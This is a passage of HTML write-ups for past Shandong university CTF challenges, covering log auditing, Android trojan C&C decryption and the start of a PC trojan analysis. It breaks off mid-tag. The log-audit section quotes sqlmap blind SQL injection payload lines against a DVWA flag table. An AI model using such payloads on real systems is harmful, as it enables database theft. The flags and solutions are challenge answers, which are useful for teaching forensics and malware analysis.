rgba(0, 0, 0, 0.04); border-radius: 3px;">hostname</code>关键词。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415784146552046.png" title="image.png" alt="image.png" width="693" height="254" style="width: 693px; height: 254px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414327159009.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">其中编号662数据原地址为服务端，是http的Response包。右键解码数据包，可以很直观的看到服务端返回的内容：</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415784815174360.png" title="image.png" alt="image.png" width="718" height="394" style="width: 718px; height: 394px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414328322112.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><h3 id="toc_50" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">3. 日志审计</h3><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">sqlmap盲注日志审计。</p><h4 id="toc_51" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">请从流量当中分析出flag。</p><h4 id="toc_52" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">本题考查根据日志，还原sqlmap采用二分法注入获得的数据。</p><h4 id="toc_53" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目是sqlmap采用二分法进行注入的日志，办法很多，可以手撕，可以根据特征进行分析。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">这里举例说一种。如果对Apache日志熟悉的话，应该知道，access.log里面会记录Response的状态码和Response包的长度。猜解正确或错误，返回的长度是不同的。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">urldecode解码几条记录：</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">id=2'&nbsp;AND&nbsp;ORD(MID((SELECT&nbsp;IFNULL(CAST(flag&nbsp;AS&nbsp;CHAR),0x20)&nbsp;FROM&nbsp;dvwa.flag_is_here&nbsp;ORDER&nbsp;BY&nbsp;flag&nbsp;LIMIT&nbsp;0,1),24,1))&gt;96&nbsp;AND&nbsp;'RCKM'='RCKM&amp;Submit=Submit&nbsp;HTTP/1.1"&nbsp;200&nbsp;1765&nbsp;
id=2'&nbsp;AND&nbsp;ORD(MID((SELECT&nbsp;IFNULL(CAST(flag&nbsp;AS&nbsp;CHAR),0x20)&nbsp;FROM&nbsp;dvwa.flag_is_here&nbsp;ORDER&nbsp;BY&nbsp;flag&nbsp;LIMIT&nbsp;0,1),24,1))&gt;112&nbsp;AND&nbsp;'RCKM'='RCKM&amp;Submit=Submit&nbsp;HTTP/1.1"&nbsp;200&nbsp;1765&nbsp;
id=2'&nbsp;AND&nbsp;ORD(MID((SELECT&nbsp;IFNULL(CAST(flag&nbsp;AS&nbsp;CHAR),0x20)&nbsp;FROM&nbsp;dvwa.flag_is_here&nbsp;ORDER&nbsp;BY&nbsp;flag&nbsp;LIMIT&nbsp;0,1),24,1))&gt;120&nbsp;AND&nbsp;'RCKM'='RCKM&amp;Submit=Submit&nbsp;HTTP/1.1"&nbsp;200&nbsp;1765&nbsp;
id=2'&nbsp;AND&nbsp;ORD(MID((SELECT&nbsp;IFNULL(CAST(flag&nbsp;AS&nbsp;CHAR),0x20)&nbsp;FROM&nbsp;dvwa.flag_is_here&nbsp;ORDER&nbsp;BY&nbsp;flag&nbsp;LIMIT&nbsp;0,1),24,1))&gt;124&nbsp;AND&nbsp;'RCKM'='RCKM&amp;Submit=Submit&nbsp;HTTP/1.1"&nbsp;200&nbsp;1765&nbsp;
id=2'&nbsp;AND&nbsp;ORD(MID((SELECT&nbsp;IFNULL(CAST(flag&nbsp;AS&nbsp;CHAR),0x20)&nbsp;FROM&nbsp;dvwa.flag_is_here&nbsp;ORDER&nbsp;BY&nbsp;flag&nbsp;LIMIT&nbsp;0,1),24,1))&gt;126&nbsp;AND&nbsp;'RCKM'='RCKM&amp;Submit=Submit&nbsp;HTTP/1.1"&nbsp;404&nbsp;5476&nbsp;
id=2'&nbsp;AND&nbsp;ORD(MID((SELECT&nbsp;IFNULL(CAST(flag&nbsp;AS&nbsp;CHAR),0x20)&nbsp;FROM&nbsp;dvwa.flag_is_here&nbsp;ORDER&nbsp;BY&nbsp;flag&nbsp;LIMIT&nbsp;0,1),24,1))&gt;125&nbsp;AND&nbsp;'RCKM'='RCKM&amp;Submit=Submit&nbsp;HTTP/1.1"&nbsp;404&nbsp;5476</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">以猜解的第24位为例，猜解正确的时候，返回的状态码为200，长度为1765；猜解错误的状态码为404，长度为5476。而且可以得出结论，sqlmap采用二分法进行注入的时候，正确的值为<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">最后一次进行＞比较正确的值+1</code>，即为125。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">简单写个脚本，匹配一下即可。</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">#&nbsp;coding:utf-8
import&nbsp;re
import&nbsp;urllib

f&nbsp;=&nbsp;open('access.log','r')
lines&nbsp;=&nbsp;f.readlines()
datas&nbsp;=&nbsp;[]for&nbsp;line&nbsp;in&nbsp;lines:
&nbsp;&nbsp;&nbsp;&nbsp;t&nbsp;=&nbsp;urllib.unquote(line)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;'1765'&nbsp;in&nbsp;t&nbsp;and&nbsp;'flag'&nbsp;in&nbsp;t:&nbsp;&nbsp;#&nbsp;过滤出与flag相关，正确的猜解
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;datas.append(t)

flag_ascii&nbsp;=&nbsp;{}&nbsp;&nbsp;
for&nbsp;data&nbsp;in&nbsp;datas:
&nbsp;&nbsp;&nbsp;&nbsp;matchObj&nbsp;=&nbsp;re.search(&nbsp;r'LIMIT&nbsp;0,1\),(.*?),1\)\)&gt;(.*?)&nbsp;AND',&nbsp;data)&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;matchObj:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key&nbsp;=&nbsp;int(matchObj.group(1))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value&nbsp;=&nbsp;int(matchObj.group(2))+1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag_ascii[key]&nbsp;=&nbsp;value&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;使用字典，保存最后一次猜解正确的ascii码
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
flag&nbsp;=&nbsp;''
for&nbsp;value&nbsp;in&nbsp;flag_ascii.values():
&nbsp;&nbsp;&nbsp;&nbsp;flag&nbsp;+=&nbsp;chr(value)
&nbsp;&nbsp;&nbsp;&nbsp;
print&nbsp;flag</pre><h3 id="toc_54" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">4.安卓木马分析</h3><h4 id="toc_55" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">在某次安全检查中，工作人员在受害者手机中提取到了两个apk文件，其中有一个是木马，请找到木马文件，并分析出该木马的C&amp;C通信服务器域名。flag的提交方式为：flag{域名}，如你分析出的结果是<a href="http://www.baidu.com/" style="box-sizing: border-box; overflow-wrap: break-word; word-break: break-all; color: rgb(65, 131, 196); text-decoration-line: none;">http://www.baidu.com</a><span class="Apple-converted-space">&nbsp;</span>，那么flag就是flag{<a href="http://www.baidu.com/" style="box-sizing: border-box; overflow-wrap: break-word; word-break: break-all; color: rgb(65, 131, 196); text-decoration-line: none;">www.baidu.com</a>}</p><h4 id="toc_56" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">安卓木马分析+异或解密</p><h4 id="toc_57" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">通过权限分析与常识判断，木马文件为apk_1.apk，使用jeb打开该文件，搜索geturl。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415797272908018.png" title="image.png" alt="image.png" width="684" height="298" style="width: 684px; height: 298px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15411423217233.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">发现改木马将C&amp;C服务器IP地址加密于logo.png文件中：</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415797598559385.png" title="image.png" alt="image.png" width="710" height="306" style="width: 710px; height: 306px;"><br style="box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15411423360312.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415798038109495.png" title="image.png" alt="image.png" width="712" height="232" style="width: 712px; height: 232px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">用editplus打开logo.png发现并非明文，应该是采用了某种加密。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415798328344053.png" title="image.png" alt="image.png" width="719" height="99" style="width: 719px; height: 99px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">向上查看代码，发现使用的加密方式为异或加密，加密因子如下：</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415798644368650.png" title="image.png" alt="image.png" width="715" height="312" style="width: 715px; height: 312px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15411423705773.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">编写如下解密脚本：</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">#coding:utf-8

import&nbsp;sys

def&nbsp;decrypt2url(decryptedfile):
&nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;=&nbsp;file(decryptedfile,&nbsp;"r")
&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;=&nbsp;f.read()
&nbsp;&nbsp;&nbsp;&nbsp;bs&nbsp;=&nbsp;map(ord,&nbsp;buf)&nbsp;#&nbsp;将字节流存储为10进制的list
&nbsp;&nbsp;&nbsp;&nbsp;sizz&nbsp;=&nbsp;len(bs)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(0,&nbsp;sizz,&nbsp;2):&nbsp;#&nbsp;将后面的字与前面的字交换存储
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;i&nbsp;&gt;=&nbsp;sizz&nbsp;/&nbsp;2&nbsp;:&nbsp;break
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d&nbsp;=&nbsp;bs[i]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bs[i]&nbsp;=&nbsp;bs[sizz&nbsp;-&nbsp;1&nbsp;-&nbsp;i]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bs[sizz&nbsp;-&nbsp;1&nbsp;-&nbsp;i]&nbsp;=&nbsp;d
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;=&nbsp;''.join(map(chr,&nbsp;bs))&nbsp;#&nbsp;将字节流转成字符串
&nbsp;&nbsp;&nbsp;&nbsp;bs2&nbsp;=&nbsp;ss.split(',')
&nbsp;&nbsp;&nbsp;&nbsp;bss&nbsp;=&nbsp;list(bs2)
&nbsp;&nbsp;&nbsp;&nbsp;sout&nbsp;=&nbsp;''
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(0,&nbsp;len(bss),&nbsp;2):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sout&nbsp;=&nbsp;sout&nbsp;+&nbsp;chr(int(bss[i]))
&nbsp;&nbsp;&nbsp;&nbsp;print(&nbsp;"[+]&nbsp;C&amp;C:&nbsp;",&nbsp;sout)
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;main(filename):
&nbsp;&nbsp;&nbsp;&nbsp;PASS&nbsp;=&nbsp;''.join(chr(x)&nbsp;for&nbsp;x&nbsp;in&nbsp;[9,&nbsp;5,&nbsp;9,&nbsp;8,&nbsp;5])&nbsp;#&nbsp;解密的原子

&nbsp;&nbsp;&nbsp;&nbsp;infile&nbsp;=&nbsp;file(filename,&nbsp;"rb")
&nbsp;&nbsp;&nbsp;&nbsp;outfile&nbsp;=&nbsp;file(filename[:-4]+".txt",&nbsp;"wb")
&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;infile.read(1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j&nbsp;=&nbsp;i&nbsp;%&nbsp;5
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d&nbsp;=&nbsp;PASS[j]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;chr(ord(c)&nbsp;^&nbsp;ord(d))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;i&nbsp;+&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outfile.write(c)
&nbsp;&nbsp;&nbsp;&nbsp;outfile.close()
&nbsp;&nbsp;&nbsp;&nbsp;infile.close()
&nbsp;&nbsp;&nbsp;&nbsp;decrypt2url(filename[:-4]+".txt")
&nbsp;&nbsp;&nbsp;&nbsp;
if&nbsp;__name__&nbsp;==&nbsp;'__main__':
&nbsp;&nbsp;&nbsp;&nbsp;main(sys.argv[1])</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">运行解密代码python decrypt_url.py logo.png 得到C&amp;C服务器地址：<a href="http://www.fineandroid.com/" style="box-sizing: border-box; overflow-wrap: break-word; word-break: break-all; color: rgb(65, 131, 196); text-decoration-line: none;">http://www.fineandroid.com/</a></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15411424002985.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415799125101026.png" title="image.png" alt="image.png" width="730" height="178" style="width: 730px; height: 178px;"></p><h4 id="toc_58" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">flag</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">flag{www.fineandroid.com}</code></p><h3 id="toc_59" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">5.PC木马分析</h3><h4 id="toc_60" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">安全分析人员在一次取证中，提取到一枚木马，但是他在虚拟机沙箱中运行该木马样本时并没有抓到这个木马的C&amp;C服务器，你能帮他分析出这个木马的C&amp;C通信服务器IP和端口么？flag提交方式flag{IP:端口}，如IP为127.0.0.1，端口为8080，那么flag为：flag{127.0.0.1:8080}</p><h4 id="toc_61" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">反虚拟机、反调试、睡眠延时绕过，进程检测，脱壳。</p><h4 id="toc_62" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">使用OD调式查看，发现木马本身做了简单的反VM虚拟机、反调试、进程检测以及超长Sleep延迟，且样本代码做了混淆，直接使用常规静态规则检测与动态沙箱检测，无法获取外连行为。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415799548384291.png" title="image.png" alt="image.png" width="721" height="594" style="width: 721px; height: 594px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414257197279.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">源码注解如下：</p><p 